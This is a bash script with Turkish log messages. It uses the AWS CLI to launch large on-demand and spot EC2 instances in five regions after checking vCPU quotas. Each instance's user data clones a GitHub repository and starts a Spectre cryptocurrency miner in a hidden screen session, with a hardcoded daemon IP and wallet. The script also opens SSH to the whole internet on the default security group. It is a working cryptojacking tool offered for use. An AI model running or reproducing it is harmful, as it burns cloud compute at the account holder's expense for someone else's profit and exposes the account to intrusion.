#!/bin/bash

# ------------------------------------------------------------------------------
# This script creates BOTH an On-Demand instance AND a Spot instance in each
# specified region, provided the vCPU limit is sufficient and a supported
# instance type is available in that region.
# ------------------------------------------------------------------------------

# Instance types to consider
declare -a instance_types=("m8g.16xlarge" "c8g.16xlarge" "r8g.16xlarge")

# Regions
declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# AMI IDs by region (ARM64 Ubuntu 24)
declare -A ami_ids
ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"
ami_ids["eu-north-1"]="ami-001e33773aec8d45f"
ami_ids["us-east-1"]="ami-0a7a4e87939439934"
ami_ids["us-west-2"]="ami-0acefc55c3a331fa8"
ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"

# Arrays to track success/failure
success_list_on_demand=()
success_list_spot=()
failed_regions_on_demand=()
failed_regions_spot=()

# ------------------------------------------------------------------------------
# Function: check_vcpu_limit
# ------------------------------------------------------------------------------
# Checks the On-Demand vCPU limit (Quota code: L-1216C47A) in the given region.
# Returns 0 (success) if vCPU limit is >= 64, otherwise returns 1.
# ------------------------------------------------------------------------------
check_vcpu_limit() {
    local region=$1
    echo "Bölge $region için vCPU limiti kontrol ediliyor..."

    local vcpu_limit
    vcpu_limit=$(aws service-quotas get-service-quota \
        --region "$region" \
        --service-code ec2 \
        --quota-code L-1216C47A \
        --query "Quota.Value" --output text 2>/dev/null)

    # Convert limit to integer
    vcpu_limit=$(printf "%.0f" "$vcpu_limit" 2>/dev/null)

    if [ -z "$vcpu_limit" ]; then
        echo "vCPU limiti alınamadı. Bölge $region atlanıyor."
        return 1
    fi

    echo "vCPU Limit: $vcpu_limit"
    if (( vcpu_limit < 64 )); then
        echo "vCPU limiti yetersiz. Bölge $region atlanıyor."
        return 1
    fi

    return 0
}

# ------------------------------------------------------------------------------
# Function: find_instance_type
# ------------------------------------------------------------------------------
# Randomly shuffles the instance_types array and returns the first instance_type
# that is offered in the given region. If none are found, returns empty string.
# ------------------------------------------------------------------------------
find_instance_type() {
    local region=$1
    for instance_type in $(shuf -e "${instance_types[@]}"); do
        local available
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text 2>/dev/null)

        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

# ------------------------------------------------------------------------------
# Function: create_instance
# ------------------------------------------------------------------------------
# Creates an EC2 instance (on-demand or spot) in the specified region.
# Parameters:
#   1) region
#   2) market_type ("on-demand" or "spot")
#   3) instance_type
#   4) ami_id
# ------------------------------------------------------------------------------
create_instance() {
    local region="$1"
    local market_type="$2"
    local instance_type="$3"
    local ami_id="$4"

    # Get the default SG ID
    local security_group_id
    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    # Open SSH (port 22) to the world for quick usage (not recommended for production)
    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 \
        2>/dev/null || true

    # User data to install packages and run the miner
    local user_data
    user_data=$(cat <<EOF
#!/bin/bash
sudo apt update -y
sudo apt install -y git screen
cd /root
git clone https://github.com/eraemm/efsaneyim.git
cd efsaneyim
chmod +x tnn-miner-arch
screen -dmS spectre ./tnn-miner-arch --spectre --daemon-address 144.91.120.111 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
EOF
    )

    # Build the AWS CLI command
    local market_options=""
    local instance_id=""

    if [ "$market_type" == "spot" ]; then
        # Spot instance
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --instance-market-options '{"MarketType":"spot"}' \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    else
        # On-demand instance
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    fi

    echo "$instance_id"
}

# ------------------------------------------------------------------------------
# MAIN SCRIPT: For each region, create On-Demand and Spot
# ------------------------------------------------------------------------------
for region in "${regions[@]}"; do

    echo "********************************************************"
    echo "Bölge: $region"

    # Check vCPU limit first
    if ! check_vcpu_limit "$region"; then
        continue  # Skip this region
    fi

    # Find a suitable instance type
    chosen_type=$(find_instance_type "$region")
    if [ -z "$chosen_type" ]; then
        echo "$region bölgesinde uygun bir instance türü bulunamadı."
        # No need to try On-Demand or Spot; region fails for both
        failed_regions_on_demand+=("$region")
        failed_regions_spot+=("$region")
        continue
    fi
    echo "Seçilen instance türü: $chosen_type"

    # Get AMI ID
    ami_id="${ami_ids[$region]}"
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için AMI ID'si tanımlanmamış."
        # No need to try On-Demand or Spot; region fails for both
        failed_regions_on_demand+=("$region")
        failed_regions_spot+=("$region")
        continue
    fi

    # ------------------------------------------------------------------
    # Create ON-DEMAND instance
    echo "---- On-Demand instance oluşturuluyor..."
    ondemand_instance_id=$(create_instance "$region" "on-demand" "$chosen_type" "$ami_id")

    if [ -n "$ondemand_instance_id" ] && [ "$ondemand_instance_id" != "None" ]; then
        echo "On-Demand instance oluşturuldu: $ondemand_instance_id"
        success_list_on_demand+=("$region:$chosen_type:$ondemand_instance_id")
    else
        echo "On-Demand instance oluşturulamadı."
        failed_regions_on_demand+=("$region")
    fi

    # ------------------------------------------------------------------
    # Create SPOT instance
    echo "---- Spot instance oluşturuluyor..."
    spot_instance_id=$(create_instance "$region" "spot" "$chosen_type" "$ami_id")

    if [ -n "$spot_instance_id" ] && [ "$spot_instance_id" != "None" ]; then
        echo "Spot instance oluşturuldu: $spot_instance_id"
        success_list_spot+=("$region:$chosen_type:$spot_instance_id")
    else
        echo "Spot instance oluşturulamadı."
        failed_regions_spot+=("$region")
    fi

done

# ------------------------------------------------------------------------------
# Print Summary
# ------------------------------------------------------------------------------
echo "==========================================================="
echo "On-Demand Başarılı bölgeler:"
printf '%s\n' "${success_list_on_demand[@]}"

echo "On-Demand Başarısız bölgeler:"
printf '%s\n' "${failed_regions_on_demand[@]}"

echo "-----------------------------------------------------------"
echo "Spot Başarılı bölgeler:"
printf '%s\n' "${success_list_spot[@]}"

echo "Spot Başarısız bölgeler:"
printf '%s\n' "${failed_regions_spot[@]}"
